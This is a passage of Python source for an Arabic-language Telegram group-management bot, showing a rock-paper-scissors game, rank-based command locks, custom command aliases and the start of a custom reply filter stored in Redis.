       )
       m.edit_message_text(text, disable_web_page_preview=True,reply_markup=rep)
   """

    name = r.get(f"{Dev_Zaid}:BotName") if r.get(f"{Dev_Zaid}:BotName") else "رعد"
    if m.data == f"RPS:rock++{m.from_user.id}":
        RPS = ["paper", "scissors", "rock"]
        kk = random.choice(RPS)
        if kk == "scissors":
            if r.get(f"{m.from_user.id}:Floos"):
                get = int(r.get(f"{m.from_user.id}:Floos"))
                r.set(f"{m.from_user.id}:Floos", get + 1)
            else:
                r.set(f"{m.from_user.id}:Floos", 1)
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: 🪨
أنا: ✂️

النتيجة: ⁪⁬⁪⁬ 🏆 {m.from_user.first_name}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )

        if kk == "paper":
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: 🪨
أنا: 📃

النتيجة: ⁪⁬⁪⁬ 🏆️ {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )
        if kk == "rock":
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: 🪨
أنا: 🪨

النتيجة: ⁪⁬⁪⁬ ⚖️ {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )

    if m.data == f"gowner+{m.from_user.id}":
        if not gowner_pls(m.from_user.id, m.message.chat.id):
            m.asnwer("هذا الامر للمالك الاساسي و فوق بس", show_alert=True)
            return m.message.delete()
        else:
            command = m.message.reply_to_message.text.split(None, 2)[2]
            r.hset(Dev_Zaid + f"locks-{m.message.chat.id}", command, 0)
            return m.edit_message_text(
                f"- تم تعيين الامر ( {command} ) للمالك الاساسي وفوق فقط"
            )

    if m.data == f"owner+{m.from_user.id}":
        if not gowner_pls(m.from_user.id, m.message.chat.id):
            m.asnwer("هذا الامر للمالك الاساسي و فوق بس", show_alert=True)
            return m.message.delete()
        else:
            command = m.message.reply_to_message.text.split(None, 2)[2]
            r.hset(Dev_Zaid + f"locks-{m.message.chat.id}", command, 1)
            return m.edit_message_text(
                f"- تم تعيين الامر ( {command} ) للمالك وفوق فقط"
            )

    if m.data == f"mod+{m.from_user.id}":
        if not gowner_pls(m.from_user.id, m.message.chat.id):
            m.asnwer("هذا الامر للمالك الاساسي و فوق بس", show_alert=True)
            return m.message.delete()
        else:
            command = m.message.reply_to_message.text.split(None, 2)[2]
            r.hset(Dev_Zaid + f"locks-{m.message.chat.id}", command, 2)
            return m.edit_message_text(
                f"- تم تعيين الامر ( {command} ) للمدير وفوق فقط"
            )

    if m.data == f"admin+{m.from_user.id}":
        if not gowner_pls(m.from_user.id, m.message.chat.id):
            m.asnwer("هذا الامر للمالك الاساسي و فوق بس", show_alert=True)
            return m.message.delete()
        else:
            command = m.message.reply_to_message.text.split(None, 2)[2]
            r.hset(Dev_Zaid + f"locks-{m.message.chat.id}", command, 3)
            return m.edit_message_text(
                f"- تم تعيين الامر ( {command} ) للادمن وفوق فقط"
            )

    if m.data == f"pre+{m.from_user.id}":
        if not gowner_pls(m.from_user.id, m.message.chat.id):
            m.asnwer("هذا الامر للمالك الاساسي و فوق بس", show_alert=True)
            return m.message.delete()
        else:
            command = m.message.reply_to_message.text.split(None, 2)[2]
            r.hset(Dev_Zaid + f"locks-{m.message.chat.id}", command, 4)
            return m.edit_message_text(
                f"- تم تعيين الامر ( {command} ) للمميز وفوق فقط"
            )

    if m.data == f"RPS:paper++{m.from_user.id}":
        RPS = ["paper", "scissors", "rock"]
        kk = random.choice(RPS)
        if kk == "rock":
            if r.get(f"{m.from_user.id}:Floos"):
                get = int(r.get(f"{m.from_user.id}:Floos"))
                r.set(f"{m.from_user.id}:Floos", get + 1)
            else:
                r.set(f"{m.from_user.id}:Floos", 1)
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: 📃
أنا: 🪨

النتيجة: ⁪⁬⁪⁬ 🏆 {m.from_user.first_name}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )

        if kk == "scissors":
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: 📃
أنا: ✂️

النتيجة: ⁪⁬⁪⁬ 🏆️ {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )
        if kk == "paper":
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: 📃
أنا: 📃

النتيجة: ⁪⁬⁪⁬ ⚖️ {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )

    if m.data == f"RPS:scissors++{m.from_user.id}":
        RPS = ["paper", "scissors", "rock"]
        kk = random.choice(RPS)
        if kk == "paper":
            if r.get(f"{m.from_user.id}:Floos"):
                get = int(r.get(f"{m.from_user.id}:Floos"))
                r.set(f"{m.from_user.id}:Floos", get + 1)
            else:
                r.set(f"{m.from_user.id}:Floos", 1)
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: ✂️
أنا: 📃

النتيجة: ⁪⁬⁪⁬ 🏆 {m.from_user.first_name}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )

        if kk == "rock":
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: ✂️
أنا: 🪨

النتيجة: ⁪⁬⁪⁬ 🏆️ {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )
        if kk == "scissors":
            rep = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🧚‍♀️", url=f"t.me/{channel}")]]
            )
            m.edit_message_text(
                f"""
أنت: ✂️
أنا: ✂️

النتيجة: ⁪⁬⁪⁬ ⚖️ {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
""",
                disable_web_page_preview=True,
                reply_markup=rep,
            )

# ==================== FILE: customCommad.py ====================

'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''

@Client.on_message(filters.text & filters.group, group=999)
def customCummandHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=addcommand,args=(c,m,k)).start()
   
   
def addcommand(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return  
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} من عيوني لغيت اضافة امر ')
   
   if r.get(f'{m.chat.id}:addCustom2:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addCustom2:{m.from_user.id}{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} من عيوني لغيت اضافة امر ')

   if text == 'الاوامر المضافه' or text == 'الاوامر المضافة':
      if not owner_pls(m.from_user.id, m.chat.id):
          return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المالك وفوق ) وبس')
      else:
          if not r.smembers(f'{m.chat.id}:listCustom:{m.chat.id}{Dev_Zaid}'):
            return m.reply(quote=True,text=f'{k} مافيه اوامر مضافه')
          else:
              text = 'الاوامر المضافة:\n'
              count = 0
              for cmnd in r.smembers(f'{m.chat.id}:listCustom:{m.chat.id}{Dev_Zaid}'):
                 count += 1
                 command = cmnd
                 cc = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={command}')
                 old_c = cc
                 text += f'{count}) {command} ~ ( {old_c} )\n'
              text += '\n༄'
              return m.reply(quote=True,text=text)
   
   if text == 'اضف امر' or text == 'تغيير امر':
     if not r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):
       if not owner_pls(m.from_user.id, m.chat.id):
          return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المالك وفوق ) وبس')
       else:
          r.set(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}',1)
          m.reply(quote=True,text=f'{k} تمام عيني ، ارسل الامر القديم عشان اغيره')
          return

   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}') and admin_pls(m.from_user.id, m.chat.id) and len(m.text) < 50:
      r.delete(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{m.chat.id}:addCustom2:{m.from_user.id}{Dev_Zaid}', m.text)
      m.reply(quote=True,text=f'{k} حلو عشان تغيير امر ( {m.text} )\n{k} ارسل الامر الجديد الحين\n☆')
      return
   
   if r.get(f'{m.chat.id}:addCustom2:{m.from_user.id}{Dev_Zaid}') and admin_pls(m.from_user.id, m.chat.id) and len(m.text) < 50:
      command_o = r.get(f'{m.chat.id}:addCustom2:{m.from_user.id}{Dev_Zaid}')
      command_n = m.text
      r.delete(f'{m.chat.id}:addCustom2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={command_n}', command_o)
      r.sadd(f'{m.chat.id}:listCustom:{m.chat.id}{Dev_Zaid}', command_n)
      m.reply(quote=True,text=f'{k} غيرت الامر القديم {command_o}\n{k} الى الامر الجديد ( {command_n} )')
      return 


@Client.on_message(filters.text & filters.group, group=1000)
def delCustomCommandHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=delcommand,args=(c,m,k)).start()
   
   
def delcommand(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   text = m.text
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={m.text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={m.text}')
   
   if r.get(f'Custom:{Dev_Zaid}&text={m.text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={m.text}')
   
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} من عيوني لغيت مسح امر ')

   if text == 'مسح الاوامر' or text == 'مسح الاوامر المضافة':
     if not mod_pls(m.from_user.id, m.chat.id):
       return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المدير وفوق ) وبس') 
     else:
       if not r.smembers(f'{m.chat.id}:listCustom:{m.chat.id}{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} مافيه اوامر مضافه')
       else:
         count = 0
         for cmnd in r.smembers(f'{m.chat.id}:listCustom:{m.chat.id}{Dev_Zaid}'):
           command = cmnd
           r.delete(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={command}')
           r.srem(f'{m.chat.id}:listCustom:{m.chat.id}{Dev_Zaid}', command)
           count += 1
         text = f'من「 {m.from_user.mention} 」\n{k} ابشر مسحت {count} أمر\n☆'
         return m.reply(quote=True,text=text)
       
   
   if text == 'مسح امر':
     if not r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}'):
       if not mod_pls(m.from_user.id, m.chat.id):
          return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المدير وفوق ) وبس')
       else:
          r.set(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}',1)
          m.reply(quote=True,text=f'{k} ارسل الامر الحين')
          return
      

   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') and admin_pls(m.from_user.id, m.chat.id) and len(m.text) < 50:
      r.delete(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}')
      if not r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={m.text}'):
         return m.reply(quote=True,text=f'{k} هذا الأمر مو مضاف')
      r.srem(f'{m.chat.id}:listCustom:{m.chat.id}{Dev_Zaid}', m.text)
      r.delete(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={m.text}')
      m.reply(quote=True,text=f'{k} من「 {m.from_user.mention} 」\n{k} ابشر مسحت الأمر\n☆')
      return
   
   
      
      
############ global CustomCommand



@Client.on_message(filters.text, group=1001)
def customCummandGlobalHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=addcommandg,args=(c,m,k)).start()
   
   
def addcommandg(c,m,k):
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   text = m.text
   if r.get(f'Custom:{Dev_Zaid}&text={m.text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={m.text}')
   
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} من عيوني لغيت اضف امر عام')
   
   if r.get(f'{m.chat.id}:addCustom2G:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addCustom2G:{m.from_user.id}{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} من عيوني لغيت اضف امر عام')

   if text == 'الاوامر العامه' or text == 'الاوامر المضافه العامه' and not m.chat.type == ChatType.PRIVATE:
      if not dev_pls(m.from_user.id, m.chat.id):
          return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المطور وفوق ) وبس')
      else:
          if not r.smembers(f'listCustom:{Dev_Zaid}'):
            return m.reply(quote=True,text=f'{k} مافيه اوامر عامه مضافه')
          else:
              text = 'الاوامر العامه:\n'
              count = 0
              for cmnd in r.smembers(f'listCustom:{Dev_Zaid}'):
                 count += 1
                 command = cmnd
                 cc = r.get(f'Custom:{Dev_Zaid}&text={command}')
                 old_c = cc
                 text += f'{count}) {command} ~ ( {old_c} )\n'
              text += '\n☆'
              return m.reply(quote=True,text=text)
   
   if text == 'اضف امر عام' or text == 'تغيير امر عام':
     if not r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):
       if not dev_pls(m.from_user.id, m.chat.id):
          return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المطور وفوق ) وبس')
       else:
          r.set(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}',1)
          m.reply(quote=True,text=f'{k} تمام عيني ، ارسل الامر القديم عشان اغيره')
          return

   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}') and dev_pls(m.from_user.id, m.chat.id) and len(m.text) < 50:
      r.delete(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{m.chat.id}:addCustom2G:{m.from_user.id}{Dev_Zaid}', m.text)
      m.reply(quote=True,text=f'{k} حلو عشان تغيير امر ( {m.text} )\n{k} ارسل الامر الجديد الحين\n☆')
      return
   
   if r.get(f'{m.chat.id}:addCustom2G:{m.from_user.id}{Dev_Zaid}') and dev_pls(m.from_user.id, m.chat.id) and len(m.text) < 50:
      command_o = r.get(f'{m.chat.id}:addCustom2G:{m.from_user.id}{Dev_Zaid}')
      command_n = m.text
      r.delete(f'{m.chat.id}:addCustom2G:{m.from_user.id}{Dev_Zaid}')
      r.set(f'Custom:{Dev_Zaid}&text={command_n}', command_o)
      r.sadd(f'listCustom:{Dev_Zaid}', command_n)
      m.reply(quote=True,text=f'{k} غيرت الامر القديم {command_o}\n{k} الى الامر الجديد ( {command_n} )')
      return 


@Client.on_message(filters.text , group=1002)
def delCustomCommandGHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=delcommandg,args=(c,m,k)).start()
   
   
def delcommandg(c,m,k):
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   text = m.text
   if r.get(f'Custom:{Dev_Zaid}&text={m.text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={m.text}')
   
   if r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} من عيوني لغيت مسح امر عام')

   if text == 'مسح الاوامر العامه':
     if not dev_pls(m.from_user.id, m.chat.id):
       return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المطور وفوق ) وبس') 
     else:
       if not r.smembers(f'listCustom:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} مافيه اوامر عامه مضافه')
       else:
         count = 0
         for cmnd in r.smembers(f'listCustom:{Dev_Zaid}'):
           command = cmnd
           r.delete(f'Custom:{Dev_Zaid}&text={command}')
           r.srem(f'listCustom:{Dev_Zaid}', command)
           count += 1
         text = f'من「 {m.from_user.mention} 」\n{k} ابشر مسحت {count} أمر عام\n☆'
         return m.reply(quote=True,text=text)
       
   
   if text == 'مسح امر عام':
     if not r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):
       if not dev_pls(m.from_user.id, m.chat.id):
          return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المطور وفوق ) وبس')
       else:
          r.set(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}',1)
          m.reply(quote=True,text=f'{k} ارسل الامر الحين')
          return
   
   if re.match("^فتح امر ",text):
     if not gowner_pls(m.from_user.id, m.chat.id):
       return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المالك الاساسي وفوق ) وبس')
     else:
       txt=text.split(None,2)[2]
       if not r.hget(Dev_Zaid+f"locks-{m.chat.id}", txt):
         return m.reply("الامر مو مقفول من قبل")
       r.hdel(Dev_Zaid+f"locks-{m.chat.id}", txt)
       return m.reply("تم فتح الامر بنجاح")
   
   if text == "الاوامر المقفوله":
      if not gowner_pls(m.from_user.id, m.chat.id):
       return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المالك الاساسي وفوق ) وبس')
      else:
        if not r.hgetall(Dev_Zaid+f"locks-{m.chat.id}"):
          return m.reply(f"{k} مافيه اوامر مقفولة")
        else:
          commands = r.hgetall(Dev_Zaid+f"locks-{m.chat.id}")
          txt = "الاوامر المقفوله:\n\n"
          count = 1
          for command in commands:
            cc = int(commands[command])
            if cc == 0:
              rank = "مالك اساسي"
            elif cc == 1:
              rank = "مالك وفوق"
            elif cc == 2:
              rank = "مدير و فوق"
            elif cc == 3:
              rank = "ادمن وفوق"
            elif cc == 4:
              rank = "مميز و فوق"
            txt += f"{count} ) {command} - ( {rank} )\n"
            count += 1
          return m.reply(txt, disable_web_page_preview=True)
   
   if text == "مسح الاوامر المقفوله":
      if not gowner_pls(m.from_user.id, m.chat.id):
       return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المالك الاساسي وفوق ) وبس')
      else:
        if not r.hgetall(Dev_Zaid+f"locks-{m.chat.id}"):
          return m.reply(f"{k} مافيه اوامر مقفولة")
        else:
          count = len(list(r.hgetall(Dev_Zaid+f"locks-{m.chat.id}").keys()))
          r.delete(Dev_Zaid+f"locks-{m.chat.id}")
          return m.reply(f"{k} ابشر مسحت ( {count} )")
   
   if re.match("^قفل امر ",text):
     if not gowner_pls(m.from_user.id, m.chat.id):
       return m.reply(quote=True,text=f'{k} هذا الامر يخص ( المالك الاساسي وفوق ) وبس')
     else:
       txt=text.split(None,2)[2]
       return m.reply(
          f"{k} حسناً عزيزي اختار نوع الرتبه :\n{k} سيتم وضع امر ↤︎( {txt} ) له فقط",
          reply_markup=InlineKeyboardMarkup(
            [
              [
                InlineKeyboardButton (
                   "مالك اساسي",
                   callback_data=f"gowner+{m.from_user.id}"
                )
              ],
              [
                InlineKeyboardButton (
                   "مالك",
                   callback_data=f"owner+{m.from_user.id}"
                )
              ],
              [
                InlineKeyboardButton (
                   "مدير",
                   callback_data=f"mod+{m.from_user.id}"
                )
              ],
              [
                InlineKeyboardButton (
                   "ادمن",
                   callback_data=f"admin+{m.from_user.id}"
                )
              ],
              [
                InlineKeyboardButton (
                   "مميز",
                   callback_data=f"pre+{m.from_user.id}"
                )
              ]
            ]
          )
       )

   if r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}') and dev_pls(m.from_user.id, m.chat.id) and len(m.text) < 50:
      r.delete(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}')
      if not r.get(f'Custom:{Dev_Zaid}&text={m.text}'):
         return m.reply(quote=True,text=f'{k} هذا الأمر مو مضاف')
      r.srem(f'listCustom:{Dev_Zaid}', m.text)
      r.delete(f'Custom:{Dev_Zaid}&text={m.text}')
      m.reply(quote=True,text=f'{k} من「 {m.from_user.mention} 」\n{k} ابشر مسحت الأمر العام\n☆')
      return
   
   
      
# ==================== FILE: customFilter.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



@Client.on_message(filters.group, group=21)
def addCustomReplyDone(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=addreply2,args=(c,m,k)).start()
    
def addreply2(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   
   TIME_ZONE = "Asia/Riyadh"
   ZONE = pytz.timezone(TIME_ZONE)
   TIME = datetime.now(ZONE)
   date = TIME.strftime("%d/%m/%Y %I:%M:%S %p")
   
   if m.text:
     if m.text == 'الغاء' and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}'):
       r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
       m.reply(f'{k} من عيوني لغيت اضافة الرد')
     
     if r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
       text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
       r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type=text&text={m.text.html}')
       r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','نص')
       r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
       r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
       r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
       return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.photo and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      type = 'photo'
      photo = m.photo.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type={type}&photo={photo}&caption={caption}')
      r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','صوره')
      r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
      r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.video and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      type = 'video'
      video = m.video.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type={type}&video={video}&caption={caption}')
      r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','فيديو')
      r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
      r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.animation and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      type = 'animation'
      anim = m.animation.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type={type}&animation={anim}&caption={caption}')
      r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','متحركه')
      r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
      r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.audio and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      type = 'audio'
      aud = m.audio.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type={type}&audio={aud}&caption={caption}')
      r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','صوت')
      r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
      r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.voice and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      type = 'voice'
      voice = m.voice.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type={type}&voice={voice}&caption={caption}')
      r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','بصمه')
